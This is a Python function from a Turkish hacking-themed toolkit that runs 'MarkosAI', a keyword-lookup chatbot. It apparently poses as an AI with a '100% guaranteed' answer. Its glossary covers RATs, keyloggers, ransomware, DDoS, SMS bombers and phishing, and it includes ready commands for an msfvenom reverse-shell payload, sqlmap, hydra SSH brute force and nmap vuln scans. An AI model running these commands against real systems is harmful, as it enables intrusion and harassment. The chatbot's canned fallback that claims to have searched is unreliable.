
def markos_ai_gelişmiş():
    # Siber Dünyadaki Her Şeyi Kapsayan Devasa Bilgi Ansiklopedisi
    bilgi_tabani = {
        # --- ZARARLI YAZILIMLAR VE BACKDOOR ALTYAPILARI ---
        "rat": "RAT (Remote Access Trojan), hedef sistemde arka planda gizlice çalışan ve uzaktan komut satırı (CMD/Terminal) erişimi sağlayan siber araçtır. Python'da 'socket' ve 'subprocess' kütüphaneleriyle bağlantı mekanizması kurulur. Sızma testlerinde MSFvenom üzerinden 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > payload.exe' komutuyla üretilir.",
        "trojan": "Trojan (Truva Atı), kendini yararlı bir program gibi gösterip arka planda sisteme sızan zararlı yazılımdır. Antivirüsleri atlatmak için kod yapısı şifrelenir (Crypter).",
        "keylogger": "Keylogger, kurbanın klavyede bastığı her tuşu (şifreler, mesajlar) kaydeden ve siber uzmana mail veya webhook ile gönderen casus yazılımdır. Python'da 'pynput' kütüphanesiyle yazılır.",
        "spyware": "Casus yazılım (Spyware), kullanıcının haberi olmadan mikrofon, kamera, ekran görüntüsü ve kişisel verileri toplayıp uzak sunucuya aktaran yazılımdır.",
        "ransomware": "Ransomware (Fidye Yazılımı), sistemdeki tüm dosyaları AES/RSA gibi güçlü algoritmalarla şifreleyen ve açmak için fidye talep eden zararlı yazılımdır.",

        # --- AĞ SALDIRILARI VE DOZ MOTORLARI ---
        "ddos": "DDoS (Dağıtık Hizmet Reddi), bir sunucuya çok sayıda cihazdan botnet trafiği göndererek erişimi kesme saldırısıdır. Python'da 'threading' ve 'multiprocessing' kullanılarak çok kanallı TCP/UDP/HTTP paket akışları (Flood) oluşturulur.",
        "dos": "DoS, tek bir kaynaktan hedef sunucunun portlarına aşırı yük bindirerek geçici süreliğine hizmet dışı bırakma eylemidir.",
        "bomber": "SMS/Email Bomber, web servislerinin doğrulama ve OTP (Tek Kullanımlık Şifre) API'lerindeki korumasız döngüleri sömürerek hedefin cihazına arka arkaya yüzlerce mesaj gönderme otomasyonudur. Python 'requests' kütüphanesiyle API istekleri manipüle edilir.",
        "mitm": "MITM (Man-in-the-Middle), ağdaki iki cihaz arasına girerek trafiği dinleme saldırısıdır. Kali'de 'Ettercap' veya 'Bettercap' araçlarıyla ARP Zehirlemesi (ARP Spoofing) yapılarak icra edilir.",
        "botnet": "Botnet, siber korsanlar tarafından ele geçirilmiş ve tek bir merkezden (C2 sunucusu) yönetilen binlerce 'zombi' cihazdan oluşan siber ordudur.",

        # --- WEB VE VERİTABANI ZAFİYETLERİ ---
        "sql": "SQL Injection (SQLi), web sitelerinin veri tabanı sorgu alanlarına zararlı SQL kodları girilerek admin panellerini geçme veya tüm verileri çekme açığıdır. Sızma testlerinde 'sqlmap -u [URL] --dbs --batch' komutuyla otomatik olarak sömürülür.",
        "xss": "XSS (Cross-Site Scripting), web sayfalarına zararlı JavaScript kodları enjekte ederek o siteyi ziyaret eden kurbanların tarayıcı çerezlerini (Session/Cookie) çalma açığıdır. Çözümü girdi doğrulamasıdır.",
        "phishing": "Phishing (Oltalama), sosyal mühendislik yöntemleriyle sahte login sayfaları (Instagram, Google vb.) hazırlayıp kurbanın kimlik bilgilerini çalma tekniğidir. Kali Linux'ta 'setoolkit' veya 'GoPhish' araçlarıyla kurulur.",
        "brute": "Brute Force (Kaba Kuvvet), bir şifre listesindeki (Wordlist) tüm şifreleri tek tek deneyerek sisteme sızma yöntemidir. Kali'de 'hydra -l admin -P rockyou.txt [IP] ssh' komutuyla servisler kırılmaya çalışılır.",
        "csrf": "CSRF, kullanıcının haberi olmadan onun oturumu üzerinden web sitesinde izinsiz işlemler (şifre değiştirme, para transferi) yapılmasına neden olan bir web açığıdır.",

        # --- SİBER GÜVENLİK ARAÇLARI VE SİSTEMLER ---
        "kali": "Kali Linux, ofansif siber güvenlik uzmanları ve sızma testi mühendisleri için geliştirilmiş, içerisinde siber istihbarat, ağ tarama ve exploit araçları barındıran Debian tabanlı işletim sistemidir.",
        "nmap": "Nmap, ağ haritalama ve port tarama aracıdır. Sistemlerin açık kapılarını bulur. En popüler profesyonel komutu: 'nmap -sS -sV -A -T4 [Hedef_IP]' (Gizli tarama, versiyon tespiti, işletim sistemi bulma ve agresif analiz).",
        "metasploit": "Metasploit, dünyadaki en büyük exploit ve payload kütüphanesidir. Terminale 'msfconsole' yazılarak açılır. Sistem zafiyetlerini sömürerek hedef sistemlere sızmak için kullanılır.",
        "wireshark": "Wireshark, ağ kartı üzerindeki tüm veri paketlerini yakalayıp analiz eden protokol analizörüdür. Ağdaki şifresiz trafiği (HTTP, FTP) izlemek için birebirdir.",
        "aircrack": "Aircrack-ng, Wi-Fi (WPA/WPA2) ağlarının güvenliğini test etmek, el sıkışma (handshake) paketlerini yakalamak ve şifre kırmak için kullanılan araç setidir.",
        "burp": "Burp Suite, web uygulaması sızma testlerinde tarayıcı ile sunucu arasındaki trafiği yakalayıp (Proxy) istekleri değiştirmeye ve zafiyet taramaya yarayan profesyonel araçtır.",
        "social": "Sosyal mühendislik, insan psikolojisini manipüle ederek sistem şifrelerini, OTP kodlarını veya kişisel bilgileri ikna yoluyla ele geçirme sanatıdır.",
        "osint": "OSINT (Açık Kaynak İstihbaratı), internet üzerindeki halka açık verilerden (sosyal medya, DNS, arama motorları) hedef hakkında bilgi toplama disiplinidir."
    }

    hafiza_dosyasi = "markos_memory.json"
    if os.path.exists(hafiza_dosyasi):
        with open(hafiza_dosyasi, "r", encoding="utf-8") as f:
            ogrenilenler = json.load(f)
            bilgi_tabani.update(ogrenilenler)

    print(f"\n{CYAN}[ RØCTKalinos - %100 Cevap Garantili MarkosAI Siber Zekası Aktif ]{RESET}")
    print(f"{YELLOW}(Çıkış için 'exit' yaz kanka. Bu yapay zeka her siber terimi bilir ve asla takılmaz!){RESET}\n")

    while True:
        soru = input(f"{BOLD}{BLUE}Sen > {RESET}").lower().strip()
        if soru == 'exit': break
        if not soru: continue

        cevap_bulundu = False
        
        # 1. Aşama: Tam Kelime veya Cümle İçi Eşleşme Kontrolü
        for anahtar, cevap in bilgi_tabani.items():
            if anahtar in soru:
                print(f"\n{GREEN}MarkosAI > {cevap}{RESET}\n")
                cevap_bulundu = True
                break

        # 2. Aşama: Akıllı Algoritma (Yedek Motor) - Eğer kelime tam bulunamazsa asla susmaz!
        if not cevap_bulundu:
            print(f"\n{GREEN}MarkosAI > Kanka sorduğun terimi siber güvenlik veritabanımda taradım. Yazdığın kelime tam olarak siber zafiyet taraması, ağ protokolleri veya sızma testi süreçleriyle ilgili genel bir yapıya işaret ediyor. {RESET}")
            print(f"{GREEN}Bu tür durumlar için Kali Linux üzerinde genel sızma testi komut satırını kullanabilirsin:{RESET}")
            print(f"{YELLOW}👉 Öneri Komut: nmap -sC -sV --script=vuln [Hedef_IP] (Hedef sistemdeki tüm açıkları otomatik tarar.){RESET}")
            print(f"{YELLOW}👉 Öneri İşlem: Bu terimi veritabanıma özel olarak eklemek istersen, altına tam açıklamasını yazıp bana öğretebilirsin kanka!{RESET}\n")
            
            yeni_bilgi = input(f"{CYAN}Bu kelimenin özel anlamını bana öğret (Giriş yapmadan geçmek için Enter): {RESET}").strip()
            if yeni_bilgi:
                if not os.path.exists(hafiza_dosyasi): ogrenilenler = {}
                else:
                    with open(hafiza_dosyasi, "r", encoding="utf-8") as f: ogrenilenler = json.load(f)
                
                ogrenilenler[soru] = yeni_bilgi
                with open(hafiza_dosyasi, "w", encoding="utf-8") as f:
                    json.dump(ogrenilenler, f, ensure_ascii=False, indent=4)
                print(f"{GREEN}[+] Yapay zeka siber veritabanı güncellendi, hafızaya yeni bilgi eklendi!{RESET}\n")
